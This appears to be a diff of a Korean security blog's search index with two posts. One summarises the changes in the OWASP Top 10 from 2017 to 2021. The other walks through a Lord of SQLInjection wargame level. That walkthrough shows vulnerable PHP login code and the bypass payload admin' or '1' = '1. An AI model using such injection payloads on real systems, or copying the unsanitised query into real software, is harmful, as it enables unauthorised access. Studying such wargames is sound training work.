+<img src="/assets/images/OWASP/owasp_top_10_2021.png">
+
+<br>
+
+<blockquote>
+<p><code>2017 A5</code>에 있던 Broken Access Control(취약한 접근 통제)가 <code>2021 A1</code>으로 올라왔습니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2017 A3</code>에 있던 Sensitive Data Exposure(민감한 데이터 노출)에 속하는  Cryptographic Failures(암호화 실패)는 <code>2021 A2</code>로 올라왔습니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2017 A1</code>에 있던 Injection(인젝션)이 <code>2021 A3</code>로 내려왔습니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2021 A4</code>에 있는 Insecure Design(안전하지 않은 설계)는 새로운 카테고리로 <code>2021 A4</code>에 생겼습니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2017 A6</code>에 있던 Security Misconfiguration(잘못된 보안 구성)이 <code>2021 A5</code>로 올라왔습니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2017 A9</code>에 있던 Using Components with Known Vulnerablilites(알려진 취약점이 있는 구성요소 사용)이 Vulnerable and Outdated Components(취약점 및 오래된 구성 요소)라는 이름으로 <code>2021 A6</code>로 올라왔습니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2017 A2</code>에 있던 Broken Authentication(취약한 인증)이 Identification and Authentication Failures(식별 및 인증 실패)라는 이름으로 <code>2021 A7</code>으로 내려왔습니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2021 A8</code>에 있는 Software and Data Integrity Failures(소프트웨어 및 데이터 무결성 오류)는 새로운 카테고리로 <code>2021 A8</code>에 생겼습니다. 기존의 <code>2017 A8</code>에 있던 Insecure Deserialization(안전하지 않은 역직렬화)보다 더 큰 범주입니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2017 A10</code>에 있던 Insufficient Logging &amp; Monitoring(불충분한 로깅 및 모니터링)이 Security Logging and Monitoring Failures(보안 로깅 및 모니터링 실패)라는 이름으로 <code>2021 A9</code>로 올라왔습니다.</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p><code>2021 A10</code>에 있는 Server-Side Request Forgery(서버측 요청 위조)는 새로운 카테고리로 <code>2021 A10</code>에 생겼습니다.</p>
+</blockquote>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="OWASP-TOP-10-2021-상세"><a href="#OWASP-TOP-10-2021-상세" class="headerlink" title="OWASP TOP 10_2021 상세"></a>OWASP TOP 10_2021 상세</h1><p>ㅡ</p>
+<hr>
+<p><strong>참고</strong></p>
+<p><a href="https://owasp.org/Top10/#whats-changed-in-the-top-10-for-2021">OWASP TOP 10</a></p>
+]]></content>
+      <categories>
+        <category>OWASP TOP 10 2021</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>OWASP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[Lord of SQLInjection] [2번_cobolt] Write UP</title>
+    <url>/2021/09/16/2021-09-16-Lord_of_SQLIjection_2_cobolt/</url>
+    <content><![CDATA[<h1 id="전체-소스코드"><a href="#전체-소스코드" class="headerlink" title="전체 소스코드"></a>전체 소스코드</h1><br>
+
+<p>2번 문제인 cobolt을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
+<br>
+
+<img src="/assets/images/Lord of SQLInjection/cobolt/source.png">
+
+<br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;cobolt&quot;</span>);</span><br><span class="line">  <span class="keyword">elseif</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<h1 id="중요-소스코드-해석"><a href="#중요-소스코드-해석" class="headerlink" title="중요 소스코드 해석"></a>중요 소스코드 해석</h1><br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;cobolt&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>1번 문제와 같이 <code>조건문</code>과 밑에 <code>query문</code>이 보입니다. </p>
+<p>또한 <code>id</code> 파라미터가 <code>admin</code> 이어야 하는 <code>조건문</code>도 있습니다.</p>
+<br>
+
+<hr>
+<h4 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h4><p><code>preg_match</code>라는 함수가 있습니다.</p>
+<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
+<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//id 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
+<br>
+
+<img src="/assets/images/Lord of SQLInjection/cobolt/preg.png">
+
+<br>
+
+<br>
+
+<hr>
+<h4 id="두번째-줄-해석"><a href="#두번째-줄-해석" class="headerlink" title="두번째 줄 해석"></a>두번째 줄 해석</h4><p>첫번째 줄과 마찬가지로 필터링 하는 것을 확인할 수 있습니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//pw 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<hr>
+<h4 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h4><p>세번째 줄은 쿼리문입니다.</p>
+<p><code>id</code>를 <code>admin</code>으로 만들어주는 동시에 참으로 만들어주면 해당 쿼리문을 우회할 수 있습니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<h1 id="SOLVE"><a href="#SOLVE" class="headerlink" title="SOLVE"></a>SOLVE</h1><br>
+
+<p><code>id</code> 부분에 <code>admin&#39; or &#39;1&#39; = &#39;1</code>를 넣어주고 <code>pw</code>에 아무 문자를 넣어주었습니다.<br><br><br></p>
+<img src = "/assets/images/Lord of SQLInjection/cobolt/solved.png">
+<br><br>
+
+<p><strong>SOLVED !!!</strong></p>
+]]></content>
+      <categories>
+        <category>Lord of SQLInjection</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Write UP</tag>
+      </tags>
+  </entry>
 </search>
